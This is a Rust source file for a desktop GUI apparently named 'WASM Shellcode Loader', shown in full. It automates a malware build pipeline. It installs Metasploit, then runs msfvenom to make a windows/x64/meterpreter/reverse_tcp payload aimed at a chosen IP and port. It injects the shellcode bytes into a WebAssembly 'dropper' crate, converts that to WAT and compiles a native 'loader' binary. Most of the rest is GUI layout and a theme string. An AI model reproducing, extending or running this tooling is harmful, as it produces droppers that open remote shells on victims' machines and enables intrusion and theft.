use eframe::egui;
use egui::{Button, Color32, Layout, RichText, Style, TextEdit, TopBottomPanel, Widget};
use std::process::Command;
use std::path::Path;
use std::sync::Arc;
use std::fs;
use std::net::UdpSocket;

fn main() -> Result<(), eframe::Error> {
    let _ = egui_logger::builder()
    .max_level(simplelog::LevelFilter::Info)
    .init();


    let options = eframe::NativeOptions {
        viewport: egui::ViewportBuilder::default().with_inner_size([560.0, 750.0]),
        ..Default::default()
    };

    eframe::run_native(
        "WASM Shellcode Loader GUI",
        options,
        Box::new(|_cc| Ok(Box::new(WasmLoaderApp::default()))),
    )
}

struct WasmLoaderApp {
    ip_address: String,
    port: String,
    generated_command: String,
    tools_status: ToolsStatus,
    first_run: bool,
}

impl Default for WasmLoaderApp {
    fn default() -> Self {
        Self {
            ip_address: Self::get_local_ip().unwrap_or_else(|| "127.0.0.1".to_string()),
            port: "4444".to_string(),
            generated_command: String::new(),
            tools_status: ToolsStatus::default(),
            first_run: false,
        }
    }
}

#[derive(Default)]
struct ToolsStatus {
    wasm_pack_installed: bool,
    wabt_installed: bool,
    msfvenom_available: bool,
    cargo_available: bool,
    metasploit_framework_installed: bool,
}

// impl Default for WasmLoaderApp {
//     fn default() -> Self {
//         Self { ip_address: Ip, port: Default::default(), generated_command: Default::default(), status: Default::default(), tools_status: Default::default(), first_run: Default::default() }
//     }
// }

impl eframe::App for WasmLoaderApp {
    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
        if !self.first_run {
            log::info!("First run");
            self.first_run = true;
            self.check_tools_status();
            match serde_json::from_str::<Style>(STYLE) {
                Ok(theme) => {
                    let style = Arc::new(theme);
                    ctx.set_style(style);
                }
                Err(e) => log::error!("Error setting theme: {e:?}")
            };
        }

        egui::CentralPanel::default().show(ctx, |ui| {
           ui.vertical_centered(|ui|  ui.heading(RichText::new("WASM Shellcode Loader").color(Color32::LIGHT_GREEN)));
            ui.separator();
            ui.add_space(10.);

            // Tools Status Section
            ui.horizontal(|ui| {
                ui.heading(RichText::new("Tools Status").color(Color32::LIGHT_BLUE));
                ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
                    if ui.button("Check Tools").clicked() {
                        self.check_tools_status();
                    }
                });
            });
            ui.add_space(10.);

            ui.columns(2, |ui| {
                ui[0].horizontal(|ui| {
                    ui.label("WasmPack");
                    match self.tools_status.wasm_pack_installed {
                        true => {
                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
                                { ui.colored_label(egui::Color32::GREEN, "Installed"); };
                            });
                        }
                        false => {
                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
                                if ui.button(RichText::new("Install WasmPack").color(Color32::LIGHT_RED)).clicked() {
                                    self.install_wasm_pack();
                                }
                            });
                        }
                    };
                });
    
                ui[0].horizontal(|ui| {
                    ui.label("WABT (wasm2wat):");
                    match self.tools_status.wabt_installed {
                        true => {
                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
                                { ui.colored_label(egui::Color32::GREEN, "Installed"); };
                            });
                        }
                        false => {
                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
                                if ui.button(RichText::new("Install WABT").color(Color32::LIGHT_RED)).clicked() {
                                    self.install_wabt();
                                }
                            });
                        }
                    };
                });

                ui[0].horizontal(|ui| {
                    ui.label("Cargo");
                    match self.tools_status.cargo_available {
                        true => {
                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
                                ui.colored_label(egui::Color32::GREEN, "Available");
                            });
                        }
                        false => {
                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| 
                                ui.colored_label(Color32::LIGHT_RED, "Not available")
                            );
                        }
                    };
                });

                ui[1].horizontal(|ui| {
                    ui.label("MsfVenom");
                    match self.tools_status.msfvenom_available {
                        true => {
                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
                                ui.colored_label(egui::Color32::GREEN, "Available");
                            });
                        }
                        false => {
                            ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| 
                                ui.colored_label(Color32::LIGHT_RED, "Not available")
                            );
                        }
                    };
                });
    
                if cfg!(target_os = "windows") {
                    ui[1].horizontal(|ui| {
                        ui.label("Metasploit Framework:");
                        match self.tools_status.metasploit_framework_installed {
                            true => {
                                ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| {
                                    { ui.colored_label(egui::Color32::GREEN, "Installed"); };
                                });
                            }
                            false => {
                                ui.with_layout(Layout::right_to_left(egui::Align::Center), |ui| 
                                    if ui.button(RichText::new("Install Metasploit").color(Color32::LIGHT_RED)).clicked() {
                                        self.install_metasploit_framework();
                                    }
                                );
                            }
                        };
                    });
                }
            });

            ui.separator();
            ui.add_space(10.);

            // Configuration Section
            ui.vertical_centered(|ui| ui.heading(RichText::new("Payload Configuration").color(Color32::LIGHT_BLUE)));
            ui.add_space(10.);
            ui.columns(2, |ui| {
                TextEdit::singleline(&mut self.ip_address).hint_text("IP Addr").ui(&mut ui[0]);
                TextEdit::singleline(&mut self.port).hint_text("Port #").ui(&mut ui[1]);
                if ui[0].button("Generate msfvenom Command").clicked() {
                    self.generate_msfvenom_command();
                }

                if self.tools_status.msfvenom_available && !self.ip_address.is_empty() && !self.port.is_empty() {
                    if ui[1].button("Run msfvenom (Generate Payload)").clicked() {
                        match Self::run_msfvenom(self.ip_address.clone(), self.port.clone()) {
                            Ok(_) => log::info!("Ran MsfVenom successfully"),
                            Err(e) => log::error!("Error running MsfVenom: {e:?}"),
                        }
                    }
                }
            });

            ui.vertical_centered(|ui| {
                if !self.generated_command.is_empty() {
                    if Button::new(&self.generated_command).ui(ui).on_hover_text("Click to Copy").clicked() {
                        ctx.copy_text(self.generated_command.clone());
                        log::info!("Command copied to clipboard!");
                    }
                }
            });

            ui.separator();
            ui.add_space(10.);

            // Build Section
            ui.vertical_centered(|ui| ui.heading(RichText::new("Build Pipeline").color(Color32::LIGHT_BLUE)));
            ui.add_space(10.);
            ui.columns(4, |ui| {
                if ui[0].button("Run Full Build").clicked() {
                    self.run_full_pipeline();
                }
    
                if ui[1].button("Build Dropper").clicked() {
                    Self::build_wasm_dropper();
                }
    
                if ui[2].button("Convert to .WAT").clicked() {
                    Self::convert_wasm_to_wat();
                }
    
                if ui[3].button("Build Loader").clicked() {
                    Self::build_wasm_loader();
                }
            });
        });

        TopBottomPanel::bottom("Logs")
        .min_height(400.)
        .show(ctx, |ui| {
            ui.set_min_height(400.);
            egui_logger::logger_ui()
            .warn_color(Color32::from_rgb(94, 215, 221)) 
            .error_color(Color32::from_rgb(255, 55, 102)) 
            .log_levels([true, true, true, false, false])                    
            .enable_category("eframe".to_string(), false)
            .enable_category("eframe::native::glow_integration".to_string(), false)
            .enable_category("egui_glow::shader_version".to_string(), false)
            .enable_category("egui_glow::painter".to_string(), false)
            .show(ui);
        });
    }
}

impl WasmLoaderApp {
    fn get_local_ip() -> Option<String> {
        // Try to connect to a remote address to determine our local IP
        // This doesn't actually send data, just determines which interface would be used
        if let Ok(socket) = UdpSocket::bind("0.0.0.0:0") {
            if let Ok(_) = socket.connect("8.8.8.8:53") {
                if let Ok(addr) = socket.local_addr() {
                    return Some(addr.ip().to_string());
                }
            }
        }
        None
    }

    fn check_tools_status(&mut self) {
        self.tools_status.wasm_pack_installed = self.check_command_exists("wasm-pack");
        self.tools_status.cargo_available = self.check_command_exists("cargo");
        
        // Check msfvenom availability - on Windows, check explicit path
        if cfg!(target_os = "windows") {
            let msfvenom_path = Path::new("C:\\metasploit-framework\\bin\\msfvenom.bat");
            self.tools_status.msfvenom_available = msfvenom_path.exists();
            // Also check if Metasploit Framework is installed by checking the same path
            self.tools_status.metasploit_framework_installed = msfvenom_path.exists();
        } else {
            self.tools_status.msfvenom_available = self.check_command_exists("msfvenom");
        }
        
        // Check if wabt is installed by looking for wasm2wat in the wabt directory or PATH
        let wabt_local = Path::new("./wabt/bin/wasm2wat").exists() || 
                        Path::new("./wabt/bin/wasm2wat.exe").exists();
        let wabt_system = self.check_command_exists("wasm2wat");
        self.tools_status.wabt_installed = wabt_local || wabt_system;
        
        log::info!("Tools status checked");
    }

    fn check_command_exists(&self, command: &str) -> bool {
        Command::new("which")
            .arg(command)
            .output()
            .map(|output| output.status.success())
            .unwrap_or_else(|_| {
                // Fallback for Windows
                Command::new("where")
                    .arg(command)
                    .output()
                    .map(|output| output.status.success())
                    .unwrap_or(false)
            })
    }

    fn install_wasm_pack(&mut self) {
        log::info!("Installing wasm-pack...");
        
        match Command::new("cargo")
            .args(&["install", "wasm-pack"])
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    log::info!("wasm-pack installed successfully!");
                    self.tools_status.wasm_pack_installed = true;
                } else {
                    log::info!("Failed to install wasm-pack: {}", 
                        String::from_utf8_lossy(&output.stderr));
                }
            }
            Err(e) => {
                log::info!("Error installing wasm-pack: {}", e);
            }
        }
    }

    fn install_wabt(&mut self) {
        log::info!("Installing wabt...");
        
        // Determine the appropriate download URL based on the platform
        let (url, filename) = if cfg!(target_os = "windows") {
            ("https://github.com/WebAssembly/wabt/releases/latest/download/wabt-1.0.37-windows.tar.gz", 
             "wabt.tar.gz")
        } else {
            ("https://github.com/WebAssembly/wabt/releases/latest/download/wabt-1.0.37-ubuntu-20.04.tar.gz", 
             "wabt.tar.gz")
        };

        // Download and extract wabt
        let download_result = Command::new("curl")
            .args(&["-L", "-o", filename, url])
            .output();

        match download_result {
            Ok(output) if output.status.success() => {
                // Extract the archive
                let _extract_result = Command::new("tar")
                    .args(&["-xzf", filename, "-C", ".", "--strip-components", "1"])
                    .current_dir("wabt")
                    .output();

                // Create wabt directory first if it doesn't exist
                let _ = std::fs::create_dir_all("wabt");
                
                let extract_result = Command::new("tar")
                    .args(&["-xzf", filename, "-C", "wabt", "--strip-components", "1"])
                    .output();

                match extract_result {
                    Ok(output) if output.status.success() => {
                        log::info!("wabt installed successfully!");
                        self.tools_status.wabt_installed = true;
                        // Clean up downloaded file
                        let _ = std::fs::remove_file(filename);
                    }
                    Ok(output) => {
                        log::info!("Failed to extract wabt: {}", 
                            String::from_utf8_lossy(&output.stderr));
                    }
                    Err(e) => {
                        log::info!("Error extracting wabt: {}", e);
                    }
                }
            }
            Ok(output) => {
                log::info!("Failed to download wabt: {}", 
                    String::from_utf8_lossy(&output.stderr));
            }
            Err(e) => {
                log::info!("Error downloading wabt: {}", e);
            }
        }
    }

    fn install_metasploit_framework(&mut self) {
        if !cfg!(target_os = "windows") {
            log::info!("Metasploit Framework installer is only available for Windows");
            return;
        }

        log::info!("Downloading Metasploit Framework installer...");
        
        let url = "https://windows.metasploit.com/metasploitframework-latest.msi";
        let filename = "metasploitframework-latest.msi";

        // Download the MSI installer
        let download_result = Command::new("curl")
            .args(&["-L", "-o", filename, url])
            .output();

        match download_result {
            Ok(output) if output.status.success() => {
                log::info!("Metasploit Framework downloaded. Opening installer...");
                
                // Launch the MSI installer
                let install_result = Command::new("msiexec")
                    .args(&["/i", filename, "/passive", "/quiet"])
                    .output();

                match install_result {
                    Ok(output) if output.status.success() => {
                        log::info!("Metasploit Framework installer launched. Please follow the installation wizard.");
                        // Note: We don't immediately update the status as the installer runs separately
                    }
                    Ok(output) => {
                        log::info!("Failed to launch installer: {}", 
                            String::from_utf8_lossy(&output.stderr));
                    }
                    Err(e) => {
                        log::info!("Error launching installer: {}", e);
                    }
                }

                // Clean up downloaded file after attempting to launch installer
                let _ = std::fs::remove_file(filename);
            }
            Ok(output) => {
                log::info!("Failed to download Metasploit Framework: {}", 
                    String::from_utf8_lossy(&output.stderr));
            }
            Err(e) => {
                log::info!("Error downloading Metasploit Framework: {}", e);
            }
        }
    }

    fn generate_msfvenom_command(&mut self) {
        if self.ip_address.is_empty() || self.port.is_empty() {
            log::info!("Please enter both IP address and port");
            return;
        }

        self.generated_command = format!(
            "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f rust",
            self.ip_address, self.port
        );
        
        log::info!("msfvenom command generated!");
    }

    fn run_full_pipeline(&mut self) {
        log::info!("Running full build pipeline...");
        
        // Check if we have the necessary tools
        if !self.tools_status.wasm_pack_installed {
            log::info!("Error: wasm-pack not installed. Please install it first.");
            return;
        }

        if !self.tools_status.wabt_installed {
            log::info!("Error: wabt not installed. Please install it first.");
            return;
        }

        if !self.tools_status.msfvenom_available {
            log::info!("Error: msfvenom not available. Please install Metasploit Framework first.");
            return;
        }

        if self.ip_address.is_empty() || self.port.is_empty() {
            log::info!("Error: Please enter IP address and port for msfvenom payload generation.");
            return;
        }
        
        let ip = self.ip_address.clone();
        let port = self.port.clone();
        std::thread::spawn(move|| {
            // Step 1: Generate payload with msfvenom and place it in wasm_dropper
            match Self::run_msfvenom(ip, port) {
                Ok(_) => log::info!("Ran MsfVenom Successfully"),
                Err(e) => log::error!("Error running MsfVenom: {e:?}"),
            };
            // Step 2: Build wasm_dropper
            Self::build_wasm_dropper();
            // Step 3: Convert to WAT
            Self::convert_wasm_to_wat();
            // Step 4: Build wasm_loader
            Self::build_wasm_loader();
        });
    }

    fn run_msfvenom(ip: String, port: String) -> anyhow::Result<(), anyhow::Error> {
        log::info!("Generating payload with msfvenom...");
        
        // Determine msfvenom executable path
        let msfvenom_cmd = if cfg!(target_os = "windows") {
            "C:\\metasploit-framework\\bin\\msfvenom.bat"
        } else {
            "msfvenom"
        };

        // Generate the payload and output to wasm_dropper directory
        let output_file = "./wasm_dropper/src/payload.rs";
        
        match Command::new(msfvenom_cmd)
            .args(&[
                "-p", "windows/x64/meterpreter/reverse_tcp",
                &format!("LHOST={ip}"),
                &format!("LPORT={port}"),
                "-f", "rust",
                "-o", output_file
            ])
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    log::info!("Payload generated successfully with msfvenom! Updating lib.rs...");
                    Self::update_lib_with_payload()?;
                    log::info!("Payload generated and lib.rs updated successfully!");
                } else {
                    return Err(anyhow::anyhow!("Failed to generate payload: {}", String::from_utf8_lossy(&output.stderr)));
                }
            }
            Err(e) => {
                return Err(anyhow::anyhow!("Error running msfvenom: {e:?}"));
            }
        }
        Ok(())
    }

    fn update_lib_with_payload() -> anyhow::Result<(), anyhow::Error>  {
        // Read the payload.rs file
        let payload_content = fs::read_to_string("wasm_dropper/src/payload.rs")?;
        
        // Parse the payload using simple string matching
        let buf_start = payload_content.find("let buf: [u8; ")
            .ok_or(anyhow::anyhow!("Could not find array declaration in payload.rs"))?;
        let size_start = buf_start + "let buf: [u8; ".len();
        let size_end = payload_content[size_start..].find(']')
            .ok_or(anyhow::anyhow!("Could not find array size end in payload.rs"))?;
        let size = &payload_content[size_start..size_start + size_end];
        
        // Find the array data
        let array_start = payload_content.find(" = [")
            .ok_or(anyhow::anyhow!("Could not find array data start in payload.rs"))?;
        let array_data_start = array_start + " = [".len();
        let array_end = payload_content[array_data_start..].find("];")
            .ok_or(anyhow::anyhow!("Could not find array data end in payload.rs"))?;
        let array_data = &payload_content[array_data_start..array_data_start + array_end];
        
        // Read the current lib.rs file
        let lib_content = fs::read_to_string("wasm_dropper/src/lib.rs")?;
        
        // Update the WASM_MEMORY_BUFFER_SIZE constant
        let mut updated_lib = lib_content;
        
        // Find and replace the buffer size
        if let Some(size_start) = updated_lib.find("const WASM_MEMORY_BUFFER_SIZE: usize = ") {
            let size_decl_start = size_start;
            let size_decl_end = updated_lib[size_start..].find(';')
                .ok_or(anyhow::anyhow!("Could not find end of WASM_MEMORY_BUFFER_SIZE declaration"))?;
            let size_decl_end = size_start + size_decl_end + 1;
            
            let new_size_decl = format!("const WASM_MEMORY_BUFFER_SIZE: usize = {};", size);
            updated_lib.replace_range(size_decl_start..size_decl_end, &new_size_decl);
        } else {
            return Err(anyhow::anyhow!("Could not find WASM_MEMORY_BUFFER_SIZE declaration in lib.rs"));
        }
        
        // Find and replace the buffer array
        if let Some(buffer_start) = updated_lib.find("static WASM_MEMORY_BUFFER: [u8; WASM_MEMORY_BUFFER_SIZE] = [") {
            let array_start = buffer_start;
            let array_end = updated_lib[buffer_start..].find("];")
                .ok_or(anyhow::anyhow!("Could not find end of WASM_MEMORY_BUFFER array"))?;
            let array_end = buffer_start + array_end + 2;
            
            let new_array = format!("static WASM_MEMORY_BUFFER: [u8; WASM_MEMORY_BUFFER_SIZE] = [{}];", array_data);
            updated_lib.replace_range(array_start..array_end, &new_array);
        } else {
            return Err(anyhow::anyhow!("Could not find WASM_MEMORY_BUFFER array declaration in lib.rs"));
        }
        
        // Write the updated lib.rs file
        fs::write("wasm_dropper/src/lib.rs", updated_lib)?;
        
        Ok(())
    }

    fn build_wasm_dropper() {
        log::info!("Building wasm_dropper...");
        
        match Command::new("wasm-pack")
            .args(&["build", "--release"])
            .current_dir("wasm_dropper")
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    log::info!("wasm_dropper built successfully!");
                } else {
                    log::info!("Failed to build wasm_dropper: {}", 
                        String::from_utf8_lossy(&output.stderr));
                }
            }
            Err(e) => {
                log::info!("Error building wasm_dropper: {}", e);
            }
        }
    }

    fn convert_wasm_to_wat() {
        log::info!("Converting WASM to WAT...");
        
        // Determine the wasm2wat executable path
        let wasm2wat_exe = if Path::new("./wabt/bin/wasm2wat.exe").exists() {
            "./wabt/bin/wasm2wat.exe"
        } else if Path::new("./wabt/bin/wasm2wat").exists() {
            "./wabt/bin/wasm2wat"
        } else {
            "wasm2wat" // Assume it's in PATH
        };

        // Ensure the target directory exists
        let target_dir = Path::new("./target/wasm32-unknown-unknown/release");
        if !target_dir.exists() {
            log::info!("Error: WASM binary not found. Please build wasm_dropper first.");
            return;
        }

        let wasm_file = "./target/wasm32-unknown-unknown/release/wasm_dropper.wasm";
        let wat_file = "./wasm_loader/src/wasm_dropper.wat";

        match Command::new(wasm2wat_exe)
            .args(&[wasm_file, "-o", wat_file])
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    log::info!("WASM converted to WAT successfully!");
                } else {
                    log::info!("Failed to convert WASM to WAT: {}", 
                        String::from_utf8_lossy(&output.stderr));
                }
            }
            Err(e) => {
                log::info!("Error converting WASM to WAT: {}", e);
            }
        }
    }

    fn build_wasm_loader() {
        log::info!("Building wasm_loader...");
        
        match Command::new("cargo")
            .args(&["build", "--release"])
            .current_dir("wasm_loader")
            .output()
        {
            Ok(output) => {
                if output.status.success() {
                    log::info!("wasm_loader built successfully! Binary is at ./target/release/wasm_loader");
                } else {
                    log::info!("Failed to build wasm_loader: {}", 
                        String::from_utf8_lossy(&output.stderr));
                }
            }
            Err(e) => {
                log::info!("Error building wasm_loader: {}", e);
            }
        }
    }
}

const STYLE: &str = r#"{"override_text_style":null,"override_font_id":null,"override_text_valign":"Center","text_styles":{"Small":{"size":10.0,"family":"Proportional"},"Body":{"size":14.0,"family":"Proportional"},"Monospace":{"size":12.0,"family":"Monospace"},"Button":{"size":14.0,"family":"Proportional"},"Heading":{"size":18.0,"family":"Proportional"}},"drag_value_text_style":"Button","wrap":null,"wrap_mode":null,"spacing":{"item_spacing":{"x":3.0,"y":3.0},"window_margin":{"left":12,"right":12,"top":12,"bottom":12},"button_padding":{"x":5.0,"y":3.0},"menu_margin":{"left":12,"right":12,"top":12,"bottom":12},"indent":18.0,"interact_size":{"x":40.0,"y":20.0},"slider_width":100.0,"slider_rail_height":8.0,"combo_width":100.0,"text_edit_width":280.0,"icon_width":14.0,"icon_width_inner":8.0,"icon_spacing":6.0,"default_area_size":{"x":600.0,"y":400.0},"tooltip_width":600.0,"menu_width":400.0,"menu_spacing":2.0,"indent_ends_with_horizontal_line":false,"combo_height":200.0,"scroll":{"floating":true,"bar_width":6.0,"handle_min_length":12.0,"bar_inner_margin":4.0,"bar_outer_margin":0.0,"floating_width":2.0,"floating_allocated_width":0.0,"foreground_color":true,"dormant_background_opacity":0.0,"active_background_opacity":0.4,"interact_background_opacity":0.7,"dormant_handle_opacity":0.0,"active_handle_opacity":0.6,"interact_handle_opacity":1.0}},"interaction":{"interact_radius":5.0,"resize_grab_radius_side":5.0,"resize_grab_radius_corner":10.0,"show_tooltips_only_when_still":true,"tooltip_delay":0.5,"tooltip_grace_time":0.2,"selectable_labels":true,"multi_widget_text_select":true},"visuals":{"dark_mode":true,"text_alpha_from_coverage":"TwoCoverageMinusCoverageSq","override_text_color":[207,216,220,255],"weak_text_alpha":0.6,"weak_text_color":null,"widgets":{"noninteractive":{"bg_fill":[0,0,0,0],"weak_bg_fill":[61,61,61,232],"bg_stroke":{"width":1.0,"color":[71,71,71,247]},"corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"fg_stroke":{"width":1.0,"color":[207,216,220,255]},"expansion":0.0},"inactive":{"bg_fill":[58,51,106,0],"weak_bg_fill":[8,8,8,231],"bg_stroke":{"width":1.5,"color":[48,51,73,255]},"corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"fg_stroke":{"width":1.0,"color":[207,216,220,255]},"expansion":0.0},"hovered":{"bg_fill":[37,29,61,97],"weak_bg_fill":[95,62,97,69],"bg_stroke":{"width":1.7,"color":[106,101,155,255]},"corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"fg_stroke":{"width":1.5,"color":[83,87,88,35]},"expansion":2.0},"active":{"bg_fill":[12,12,15,255],"weak_bg_fill":[39,37,54,214],"bg_stroke":{"width":1.0,"color":[12,12,16,255]},"corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"fg_stroke":{"width":2.0,"color":[207,216,220,255]},"expansion":1.0},"open":{"bg_fill":[20,22,28,255],"weak_bg_fill":[17,18,22,255],"bg_stroke":{"width":1.8,"color":[42,44,93,165]},"corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"fg_stroke":{"width":1.0,"color":[109,109,109,255]},"expansion":0.0}},"selection":{"bg_fill":[23,64,53,27],"stroke":{"width":1.0,"color":[12,12,15,255]}},"hyperlink_color":[135,85,129,255],"faint_bg_color":[17,18,22,255],"extreme_bg_color":[9,12,15,83],"text_edit_bg_color":null,"code_bg_color":[30,31,35,255],"warn_fg_color":[61,185,157,255],"error_fg_color":[255,55,102,255],"window_corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"window_shadow":{"offset":[0,0],"blur":7,"spread":5,"color":[17,17,41,118]},"window_fill":[11,11,15,255],"window_stroke":{"width":1.0,"color":[77,94,120,138]},"window_highlight_topmost":true,"menu_corner_radius":{"nw":6,"ne":6,"sw":6,"se":6},"panel_fill":[12,12,15,255],"popup_shadow":{"offset":[0,0],"blur":8,"spread":3,"color":[19,18,18,96]},"resize_corner_size":18.0,"text_cursor":{"stroke":{"width":2.0,"color":[197,192,255,255]},"preview":true,"blink":true,"on_duration":0.5,"off_duration":0.5},"clip_rect_margin":3.0,"button_frame":true,"collapsing_header_frame":true,"indent_has_left_vline":true,"striped":true,"slider_trailing_fill":true,"handle_shape":{"Rect":{"aspect_ratio":0.5}},"interact_cursor":"Crosshair","image_loading_spinners":true,"numeric_color_space":"GammaByte","disabled_alpha":0.5},"animation_time":0.083333336,"debug":{"debug_on_hover":false,"debug_on_hover_with_all_modifiers":false,"hover_shows_next":false,"show_expand_width":false,"show_expand_height":false,"show_resize":false,"show_interactive_widgets":false,"show_widget_hits":false,"show_unaligned":true},"explanation_tooltips":false,"url_in_tooltip":false,"always_scroll_the_only_direction":true,"scroll_animation":{"points_per_second":1000.0,"duration":{"min":0.1,"max":0.3}},"compact_menu_style":true}"#;